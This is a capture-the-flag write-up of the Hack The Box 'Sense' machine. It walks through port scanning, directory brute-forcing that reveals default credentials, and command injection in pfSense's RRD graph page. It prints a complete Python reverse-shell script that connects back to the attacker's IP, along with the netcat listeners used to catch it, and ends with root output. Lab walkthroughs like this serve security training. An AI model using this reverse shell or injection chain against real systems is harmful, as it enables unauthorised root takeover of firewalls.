---
title: "HTB - Sense"
classes: wide
tag:
- "CVE"
- "Easy Box"
- "TJ_Null's OSCP Prep"
header:
  teaser: /assets/images/htb/htb.png
ribbon: lawngreen
description: "Writeup for HTB - Sense"
categories:
  - HTB
---

- [BoxInfo- Sense](#boxinfo)
- [Recon](#recon)
	- [Nmap Scan](#nmap-scan)
- [Enumeration](#enumeration)
	- [Site](#site)
	- [Directory Brute-force](#dbf)
- [Exploit pfSense](#exploit-pfSense)
- [Shell as root](#shell-as-root)

## BoxInfo- Sense

The given box ```Sense``` is a pfSense machine. It hosts a site which is vulnerable to [CVE-2014-4688](https://nvd.nist.gov/vuln/detail/CVE-2014-4688) through it exploited the service. No privesc in this machine.

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/sense/assets/images/Sense.png" >
</center>

## Recon 

### Nmap Scan

`nmap` found 2 open ports on TCP scans where both ports are http service.

```shell

┌[us-vip-1]─[10.10.16.6][0xM3M0RY㉿kali]─[~/htb/easy_sense]
└╼[★]$ cat nmap/initials_scans.nmap
# Nmap 7.92 scan initiated Tue Sep 20 02:20:18 2022 as: nmap -Pn -sC -sV -oN nmap/initials_scans.nmap -v 10.10.10.60
Nmap scan report for 10.10.10.60
Host is up (0.22s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
|_http-favicon: Unknown favicon MD5: 082559A7867CF27ACAB7E9867A8B320F
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-10-14T19:21:35
| Not valid after:  2023-04-06T19:21:35
| MD5:   65f8 b00f 57d2 3468 2c52 0f44 8110 c622
|_SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02
|_http-server-header: lighttpd/1.4.35
|_ssl-date: TLS randomness does not represent time

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 20 02:21:16 2022 -- 1 IP address (1 host up) scanned in 57.44 seconds
```


## Enumeration

While connecting to that site it redirects and accept the SSL certification and navigates to `https` site of that machine.

### Site

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/sense/assets/images/1.png" >
</center>

The possible way to enumerate more on this phase is directory bruteforcing and default password. Besides this we need to find the technology used to develop this login site

`<form id="iform" name="iform" method="post"  action="/index.php">` 

From the above html part, it is developed in `php`.

### Directory Brute-force

```shell
┌[us-vip-1]─[10.10.16.6][0xM3M0RY㉿kali]─[~/htb/easy_sense/bf]
└╼[★]$ gobuster dir -u https://10.10.10.60/ -w directory-list-2.3-medium.txt -k -x txt -t 250 -s 200,301,204,302
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60/
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2022/09/20 02:41:06 Starting gobuster in directory enumeration mode
===============================================================
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]
/changelog.txt        (Status: 200) [Size: 271]
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]
/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]
/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/]
/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]
/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]
/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]
/system-users.txt     (Status: 200) [Size: 106]
/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]
Progress: 324434 / 441122 (73.55%)                                                 ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2022/09/20 02:45:09 Finished
===============================================================
```

By brute-forcing we got two .txt files they are `changelog.txt & system-users.txt`  looking into that an interesting message note was found in changelog.txt whereas in system-users.txt file we got the username and password (company defaults).

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/sense/assets/images/2.png" >
</center>

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/sense/assets/images/3.png" >
</center>

	username: Rohit (small r)
	password: pfSense (company defaults)

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/sense/assets/images/4.png" >
</center>

## Exploit pfSense

Based on the version of pfSense `2.1.3-release` and googling it we got the below vulnerabilities and poc to the exploit this machine

[Reference to exploit the pfSense](#https://www.proteansec.com/linux/pfSense-vulnerabilities-part-2-command-injection/)

`/status_rrd_graph_img.php?start=1663575972&end=1663604772&database=system-processor.rrd&style=inverse&graph=eight_hour`

Using burp-suite intercept the request and modify the parameters,

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/sense/assets/images/5.png" >
</center>

Run the `netcat (nc)` listener in the background to get back the output.

## Shell as root

Through persisting the shell we are into `root` shell.

Since we can't use bad-characters like `/ and -` we should modify those characters using ascii.

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/sense/assets/images/6.png" >
</center>

Create a python reverse shell to send it to machine to get the connection back

```shell
┌[us-vip-1]─[10.10.16.6][0xM3M0RY㉿kali]─[~/htb/easy_sense]
└╼[★]$ cat send_cmd
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.6",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/sense/assets/images/7.png" >
</center>

Using the burp-suite send the request to get the python shell code and followed by run that particular script in the background so that once the socket connection is get closed we'll receive our shell back parallely run the listener.

```shell
┌[us-vip-1]─[10.10.16.6][0xM3M0RY㉿kali]─[~/htb/easy_sense]
└╼[★]$ nc -lvnp 9001 < send_cmd
listening on [any] 9001 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.60] 28128
^C
```

```shell
┌[us-vip-1]─[10.10.16.6][0xM3M0RY㉿kali]─[~/htb/easy_sense]
└╼[★]$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.60] 26196
# id
id
uid=0(root) gid=0(wheel) groups=0(wheel)
# whoami
whoami
root
# ifconfig
ifconfig
em0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> metric 0 mtu 1500
        options=9b<RXCSUM,TXCSUM,VLAN_MTU,VLAN_HWTAGGING,VLAN_HWCSUM>
        ether 00:50:56:b9:15:2d
        inet 10.10.10.60 netmask 0xffffff00 broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:152d%em0 prefixlen 64 scopeid 0x1
        nd6 options=1<PERFORMNUD>
        media: Ethernet autoselect (1000baseT <full-duplex>)
        status: active
plip0: flags=8810<POINTOPOINT,SIMPLEX,MULTICAST> metric 0 mtu 1500
enc0: flags=0<> metric 0 mtu 1536
pfsync0: flags=0<> metric 0 mtu 1460
        syncpeer: 224.0.0.240 maxupd: 128 syncok: 1
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
        options=3<RXCSUM,TXCSUM>
        inet 127.0.0.1 netmask 0xff000000
        inet6 ::1 prefixlen 128
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x5
        nd6 options=3<PERFORMNUD,ACCEPT_RTADV>
pflog0: flags=100<PROMISC> metric 0 mtu 33144
#
```